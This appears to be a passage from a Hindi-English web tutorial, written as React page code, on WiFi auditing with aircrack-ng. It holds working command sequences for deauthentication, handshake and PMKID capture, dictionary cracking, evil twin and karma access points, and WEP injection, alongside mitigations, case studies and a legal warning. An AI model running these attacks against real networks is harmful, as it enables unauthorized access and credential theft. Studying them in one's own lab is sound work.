        <li><strong className="text-white">Client Isolation:</strong> AP-level client isolation enable करो — clients एक-दूसरे को directly access नहीं कर सकते</li>
        <li><strong className="text-white">Deauth Detection:</strong> Wireless controller पर deauth flood alerting enable करो — attack का sign है</li>
        <li><strong className="text-white">Rogue AP Detection:</strong> Wireless IDS deploy करो — unauthorized APs automatically detect होंगे</li>
        <li><strong className="text-white">Regular Password Rotation:</strong> WiFi passwords हर 90 days change करो — captured handshakes useless हो जाएंगे</li>
        <li><strong className="text-white">VLAN Segmentation:</strong> Guest और corporate networks अलग VLANs पर रखो — compromise का impact limited</li>
        <li><strong className="text-white">WIDS/WIPS:</strong> Dedicated wireless intrusion detection system deploy करो — continuous monitoring</li>
        <li><strong className="text-white">Captive Portal:</strong> Guest network पर captive portal + rate limiting — automated attacks slow होंगे</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <CodeBlock
        title="WiFi Hacking Lab"
        code={`# Lab Setup Requirements:
# 1. Kali Linux / Nethunter device
# 2. Monitor mode capable WiFi adapter
# 3. Target router (अपना पुराना router use करो)

# Step 1: Router setup:
# - WPA2-Personal enable करो
# - Test password set करो (जैसे: password123)
# - SSID set करो: TestNetwork

# Step 2: WiFi adapter setup:
# USB adapter plug करो:
lsusb  # Adapter detect check
iwconfig  # wlan0 दिखना चाहिए

# Step 3: Monitor mode:
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 4: Practice workflow:
sudo airodump-ng wlan0mon  # Scan
sudo airodump-ng -c 6 --bssid ROUTER_MAC -w lab wlan0mon  # Capture
sudo aireplay-ng --deauth 3 -a ROUTER_MAC wlan0mon  # Deauth
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b ROUTER_MAC lab-01.cap  # Crack

# Safe practice:
# केवल अपने lab router पर करें
# Neighbor के WiFi पर कभी न करें
# Physical distance maintain करो — signal strength matter करती है

# Lab variations:
# 1. WEP network — crack in minutes
# 2. WPA2 weak password — dictionary attack
# 3. WPA2 strong password — show brute force difficulty
# 4. WPA3 — demonstrate attack resistance`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced WiFi Attacks"
        code={`# PMKID Attack (बिना client):
# hcxdumptool use करो:
sudo hcxdumptool -i wlan0mon --filterlist_ap=target.txt --filtermode=2 -o pmkid.pcapng
# Hashcat से crack करो:
hashcat -m 22000 pmkid.pcapng /usr/share/wordlists/rockyou.txt

# Evil Twin Attack:
# airbase-ng से fake AP बनाओ:
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
# Captive portal setup करो — credentials capture

# Karma Attack:
# Client के probe requests respond करो:
sudo airbase-ng -P -C 30 -e "TargetNetwork" wlan0mon

# WEP Injection Speed Up:
# ARP replay attack:
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
# Fragmentation attack:
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF wlan0mon
# ChopChop attack:
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF wlan0mon

# Channel Hopping Optimization:
# अगर target channel unknown है:
# Fast scan (2.4GHz only):
sudo airodump-ng --band bg wlan0mon
# 5GHz scan:
sudo airodump-ng --band a wlan0mon

# Client-less Attack (PMKID):
# यह सबसे stealthy method है
# किसी client की ज़रूरत नहीं
# AP directly PMKID leak करता है`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        <strong className="text-white">Case Study 1 — Corporate WiFi Audit:</strong> एक company ने authorized penetration test करवाया। aircrack-ng से सभी WiFi networks scan किए, 3 networks में weak passwords मिले। Dictionary attack से 2 घंटे में crack हो गए। Report में WPA3 upgrade और strong password policy recommend की गई।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Hotel WiFi Security:</strong> एक hotel का WiFi audit में WEP encryption मिला — 5 minutes में crack। Guest network और internal network same VLAN पर थे — guest से internal access possible था। Report में network segmentation और WPA3 migration recommend किया गया।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — IoT Device Testing:</strong> Smart office devices (cameras, printers) का WiFi audit। कई devices default credentials use कर रही थीं। aircrack-ng से network access मिला, फिर devices को access करके firmware extract किया। Vulnerability report में credential change और firmware update recommend किया गया।
      </p>
      <p>
        <strong className="text-white">Case Study 4 — WPS Vulnerability:</strong> Router audit में WPS enabled मिला। Reaver से WPS PIN crack करके WPA2 password मिला — बिना dictionary attack के। Router settings में WPS disable करने की recommendation दी गई।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        aircrack-ng को दूसरे tools के साथ combine करके comprehensive WiFi audit कर सकते हो:
      </p>
      <CodeBlock
        title="Kismet + Aircrack-ng Combo"
        code={`# Kismet — passive wireless monitoring
# Kismet install:
sudo apt install kismet

# Kismet start (monitor mode automatically):
sudo kismet -c wlan0mon

# Kismet में:
# - सभी networks और clients detect होते हैं
# - Hidden SSIDs reveal होते हैं
# - Client movement track होता है
# - Alerts generate होते हैं

# Aircrack-ng से handshake capture करो:
# Kismet से target BSSID और channel लो
sudo airodump-ng -c CHANNEL --bssid BSSID -w capture wlan0mon`}
      />
      <CodeBlock
        title="Wifite2 Automated Audit"
        code={`# Wifite2 — fully automated WiFi auditing
# Install:
sudo apt install wifite2

# Run (automated everything):
sudo wifite2

# यह automatically:
# 1. Monitor mode enable करता है
# 2. Networks scan करता है
# 3. Best target select करता है
# 4. WPS, WPA, WEP attacks try करता है
# 5. Handshake capture करता है
# 6. Dictionary attack करता है

# Custom options:
sudo wifite2 --wpa --dict /usr/share/wordlists/rockyou.txt
sudo wifite2 --wps --pmkid
sudo wifite2 --kill`}
      />

      <h2>Performance Tuning</h2>
      <p>
        WiFi attack speed और success rate optimize करने के tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Adapter Selection:</strong> High-gain antenna वाला adapter use करो — Alfa AWUS036ACH best है</li>
        <li><strong className="text-white">Physical Proximity:</strong> Target AP के close जाओ — signal strength -50 dBm से अच्छा होना चाहिए</li>
        <li><strong className="text-white">Channel Lock:</strong> Specific channel lock करो — channel hopping capture incomplete करता है</li>
        <li><strong className="text-white">GPU Cracking:</strong> Hashcat use करो aircrack-ng की जगह — GPU 100x faster crack करता है</li>
        <li><strong className="text-white">Wordlist Optimization:</strong> Custom wordlist बनाओ target-specific — rockyou.txt generic है</li>
        <li><strong className="text-white">PMKID Attack:</strong> Client-less attack try करो पहले — अगर काम करे तो deauth की ज़रूरत नहीं</li>
        <li><strong className="text-white">Interference Reduce:</strong> USB 3.0 interference cause करता है — USB 2.0 port use करो</li>
        <li><strong className="text-white">Multiple Adapters:</strong> एक adapter capture करे, दूसरा deauth — parallel work faster है</li>
        <li><strong className="text-white">Antenna Upgrade:</strong> Directional antenna use करो — focused signal better capture करता है</li>
        <li><strong className="text-white">Capture File Management:</strong> Large capture files slow down cracking — split करो ज़रूरत पड़े तो</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        WiFi security audit के बाद results को properly document करना ज़रूरी है। aircrack-ng के outputs को analyze करके client-ready report बनानी होती है। Capture files, crack results, और network details सब document होने चाहिए।
      </p>
      <CodeBlock
        title="WiFi Audit Report Generator"
        code={`#!/bin/bash
# WiFi Audit Report Generator

REPORT_FILE="/tmp/wifi_audit_report.txt"
CAPTURE_DIR="/tmp/wifi_captures"
mkdir -p $CAPTURE_DIR

echo "============================================" > $REPORT_FILE
echo "WiFi Security Audit Report" >> $REPORT_FILE
echo "Date: $(date)" >> $REPORT_FILE
echo "Auditor: $(whoami)" >> $REPORT_FILE
echo "============================================" >> $REPORT_FILE
echo "" >> $REPORT_FILE

# Network scan results:
echo "[*] Scanning WiFi networks..." >> $REPORT_FILE
timeout 60 sudo airodump-ng wlan0mon --output-format csv -w $CAPTURE_DIR/scan

# Parse results:
echo "=== Networks Found ===" >> $REPORT_FILE
grep "WPA" $CAPTURE_DIR/scan-01.csv | awk -F',' '{
    print "ESSID: "$14" | BSSID: "$1" | CH: "$4" | ENC: "$6" | PWR: "$3
}' >> $REPORT_FILE

echo "" >> $REPORT_FILE
echo "=== Vulnerable Networks ===" >> $REPORT_FILE
# WEP networks (critical):
grep " WEP " $CAPTURE_DIR/scan-01.csv | awk -F',' '{
    print "[CRITICAL] WEP: "$14" ("$1")"
}' >> $REPORT_FILE
# Open networks:
grep " OPN " $CAPTURE_DIR/scan-01.csv | awk -F',' '{
    print "[HIGH] Open: "$14" ("$1")"
}' >> $REPORT_FILE

echo "" >> $REPORT_FILE
echo "=== Handshake Captures ===" >> $REPORT_FILE
for cap in $CAPTURE_DIR/*.cap; do
    if aircrack-ng "$cap" 2>/dev/null | grep -q "handshake"; then
        echo "[+] Handshake found: $cap" >> $REPORT_FILE
    fi
done

echo "" >> $REPORT_FILE
echo "=== Crack Results ===" >> $REPORT_FILE
echo "See individual capture files for crack details" >> $REPORT_FILE

echo "[+] Report saved to $REPORT_FILE"
cat $REPORT_FILE`}
      />
      <CodeBlock
        title="Capture File Analysis"
        code={`# Capture file statistics:
# .cap file analyze करो:
aircrack-ng capture-01.cap
# Handshake count दिखाता है

# CSV output analyze:
cat /tmp/scan-01.csv | head -20
# Columns: BSSID, First_time, Last_time, channel, Speed,
# Privacy, Cipher, Authentication, Power, beacons, IV, LAN, ESSID

# Wireshark में detailed analysis:
wireshark capture-01.cap
# Filters:
# eapol — WPA handshake frames
# wlan.fc.type_subtype == 0x08 — Beacon frames
# wlan.fc.type_subtype == 0x04 — Probe requests

# Merge multiple captures:
mergecap -w merged.cap capture-01.cap capture-02.cap capture-03.cap

# Convert formats:
# cap to hccapx (hashcat):
cap2hccapx.bin capture-01.cap output.hccapx
# cap to hc22000 (hashcat 6+):
hcxpcapngtool -o output.hc22000 capture-01.cap

# Extract client list:
tshark -r capture-01.cap -T fields -e wlan.sa | sort -u`}
      />
      <CodeBlock
        title="Automated Vulnerability Scoring"
        code={`#!/bin/bash
# WiFi Vulnerability Scorer

SCORE=0
FINDINGS=""

# Check for WEP networks:
WEP_COUNT=$(grep -c " WEP " /tmp/scan-01.csv 2>/dev/null || echo 0)
if [ "$WEP_COUNT" -gt 0 ]; then
    SCORE=$((SCORE + WEP_COUNT * 10))
    FINDINGS="$FINDINGS\n[CRITICAL] $WEP_COUNT WEP networks found"
fi

# Check for open networks:
OPEN_COUNT=$(grep -c " OPN " /tmp/scan-01.csv 2>/dev/null || echo 0)
if [ "$OPEN_COUNT" -gt 0 ]; then
    SCORE=$((SCORE + OPEN_COUNT * 5))
    FINDINGS="$FINDINGS\n[HIGH] $OPEN_COUNT open networks found"
fi

# Check for WPS enabled:
WPS_COUNT=$(grep -c "1.0" /tmp/scan-01.csv 2>/dev/null || echo 0)
if [ "$WPS_COUNT" -gt 0 ]; then
    SCORE=$((SCORE + WPS_COUNT * 3))
    FINDINGS="$FINDINGS\n[MEDIUM] $WPS_COUNT WPS-enabled networks"
fi

# Report:
echo "=== WiFi Security Score ==="
echo "Total Score: $SCORE (lower is better)"
echo -e "$FINDINGS"
echo ""
echo "Risk Level:"
if [ $SCORE -gt 20 ]; then
    echo "[!] HIGH RISK — immediate action required"
elif [ $SCORE -gt 10 ]; then
    echo "[*] MEDIUM RISK — review recommended"
else
    echo "[+] LOW RISK — good security posture"
fi`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'क्या aircrack-ng free है?', a: 'हाँ, पूरी तरह free और open source (GPLv2 license)। कमर्शियल use भी free।' },
          { q: 'कौन सा WiFi adapter best है?', a: 'Alfa AWUS036ACH (dual band, monitor mode, injection) सबसे popular है। TP-Link TL-WN722N v1 भी अच्छा है (v2/v3 monitor mode support नहीं करते)।' },
          { q: 'WPA3 crack हो सकता है?', a: 'अभी practical attack नहीं है। WPA3 SAE (Simultaneous Authentication of Equals) handshake capture-based attacks से safe है। Dragonblood theoretical vulnerability है।' },
          { q: 'कितना समय लगता है crack करने में?', a: 'Dictionary attack — wordlist पर depend करता है (seconds से hours)। Brute force — years लग सकते हैं। GPU cracking (hashcat) 10-100x faster है।' },
          { q: 'Android phone पर चलता है?', a: 'हाँ! Nethunter (rooted Android) पर चलता है। External OTG WiFi adapter चाहिए। Internal adapter monitor mode support नहीं करता।' },
          { q: 'क्या सिर्फ handshake से password मिल सकता है?', a: 'Handshake crack करना पड़ता है — dictionary या brute force से। अगर password wordlist में नहीं है तो नहीं मिलेगा। PMKID attack alternative है।' },
          { q: 'PMKID attack क्या है?', a: 'PMKID (Pairwise Master Key Identifier) attack में AP directly first EAPOL frame में PMKID leak करता है। Client की ज़रूरत नहीं। hcxdumptool + hashcat से crack होता है।' },
          { q: 'Multiple WiFi adapters use कर सकते हैं?', a: 'हाँ! एक adapter monitor mode में capture करे, दूसरा normal mode में internet access करे। बहुत useful है real-world testing में।' },
          { q: 'WPA2-Enterprise crack हो सकता है?', a: 'WPA2-Enterprise (802.1X) direct crack नहीं होता — per-user RADIUS authentication होता है। Evil Twin + captive portal से credentials capture कर सकते हो। hostapd-mana या Eaphammer use करो।' },
          { q: 'Hidden SSID reveal कैसे करें?', a: 'airodump-ng automatically hidden SSIDs reveal करता है जब कोई client connect होता है। Probe request frames में SSID होता है। aireplay-ng से deauth करो — client reconnect पर SSID reveal होगा।' },
          { q: '5GHz WiFi crack करना harder है?', a: '5GHz networks crack करना technically same है, लेकिन adapter support limited है। 5GHz capable adapter (Alfa AWUS036ACH) चाहिए। Channel width wider है — more channels to monitor।' },
          { q: 'Hashcat vs aircrack-ng — कौन बेहतर?', a: 'Speed: hashcat 100x faster (GPU)। aircrack-ng CPU-only है। Recommendation: aircrack-ng से handshake capture करो, hashcat से crack करो। दोनों complementary tools हैं।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Wifite2</td><td className="py-2 px-3">Automated WiFi auditing</td><td className="py-2 px-3">Fully automated — one command</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Bettercap</td><td className="py-2 px-3">MITM + WiFi attacks</td><td className="py-2 px-3">Modern, Go-based, BLE support</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Fern WiFi Cracker</td><td className="py-2 px-3">GUI WiFi cracker</td><td className="py-2 px-3">Graphical interface, easy to use</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">hcxdumptool</td><td className="py-2 px-3">PMKID capture</td><td className="py-2 px-3">बिना client PMKID capture</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Kismet</td><td className="py-2 px-3">Wireless IDS/sniffer</td><td className="py-2 px-3">Passive monitoring, alerting</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Hashcat</td><td className="py-2 px-3">GPU password cracking</td><td className="py-2 px-3">100x faster than CPU cracking</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Reaver</td><td className="py-2 px-3">WPS PIN attack</td><td className="py-2 px-3">WPS vulnerability exploitation</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Fluxion</td><td className="py-2 px-3">Evil twin + captive portal</td><td className="py-2 px-3">Social engineering WiFi attack</td></tr>
          </tbody>
        </table>
      </div>

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>हमेशा external WiFi adapter use करो — internal adapter monitor mode support नहीं करता</li>
          <li>PMKID attack सबसे fast है — client की ज़रूरत नहीं, hcxdumptool use करो</li>
          <li>Hashcat से GPU cracking करो — aircrack-ng से 100x faster है</li>
          <li>बड़ा wordlist use करो — rockyou.txt से शुरू करो, फिर custom wordlist बनाओ</li>
          <li>WPA3 आने पर upgrade करो — WPA2 vulnerable है dictionary attacks से</li>
          <li>airmon-ng check kill हमेशा पहले करो — interfering processes बंद करो</li>
          <li>Capture file की backup रखो — corrupt हो सकता है improper shutdown पर</li>
          <li>PMF (802.11w) enable करो deauth attacks से बचने के लिए</li>
          <li>Signal strength check करो — -70 dBm से कम होने पर capture unreliable है</li>
          <li>Multiple wordlists combine करो — crunch, cewl, और rockyou.txt merge करो</li>
          <li>airodump-ng output को CSV format में save करो — analysis के लिए useful है</li>
          <li>Practice lab setup करो — अपने router पर test करो पहले, real targets पर बाद में</li>
          <li>5GHz networks ज़्यादा secure हैं — channel width wider है और interference कम</li>
          <li>Client-less PMKID attack सबसे stealthy method है — hcxdumptool + hashcat combo use करो</li>
          <li>WiFi hacking के लिए early morning best time है — कम interference, better signal capture</li>
          <li>Capture files को encrypted folder में store करो — sensitive data होता है इनमें</li>
          <li>Multiple wordlists combine करो — rockyou.txt + custom + crunch-generated merge करो</li>
          <li>WPA3 transition mode networks में WPA2 fallback होता है — उसे target करो</li>
          <li>Hidden SSIDs airodump-ng में probe requests से reveal होते हैं — clients के probe frames देखो</li>
          <li>WiFi signal strength -50 dBm से बेहतर होनी चाहिए reliable capture के लिए</li>
          <li>Enterprise networks (WPA2-Enterprise) crack नहीं होते — सिर्फ Evil Twin + credential capture possible है</li>
          <li>airodump-ng CSV output को Excel/Google Sheets में import करो — sorting और filtering आसान</li>
          <li>WiFi channel 1, 6, 11 (2.4GHz) सबसे common हैं — interference avoid करने के लिए</li>
          <li>Capture files बड़े हो सकते हैं — disk space check करो before long captures</li>
          <li>Deauth attack के बाद 5-10 seconds wait करो — client reconnect होने में time लगता है</li>
          <li>WiFi adapter plug-in करने के बाद 5 seconds wait करो — driver load होने में time लगता है</li>
          <li>Monitor mode में internet access नहीं होता — second adapter use करो या USB tethering</li>
          <li>Capture files को immediately backup करो — aircrack-ng corrupt files recover नहीं कर सकता</li>
          <li>WiFi adapter antenna position matter करता है — vertical position best coverage देती है</li>
          <li>Kismet + aircrack-ng combo सबसे powerful WiFi audit setup है</li>
          <li>Practice करते समय neighbor networks accidentally target न हों — distance maintain करो</li>
        </ul>
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> aircrack-ng एक शक्तिशाली WiFi security testing tool है। इसका इस्तेमाल केवल अपने स्वयं के नेटवर्क या अधिकृत पेनेट्रेशन टेस्टिंग में ही करें। बिना अनुमति के WiFi नेटवर्क में घुसना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है।
      </div>
    </TutorialLayout>
  )
}
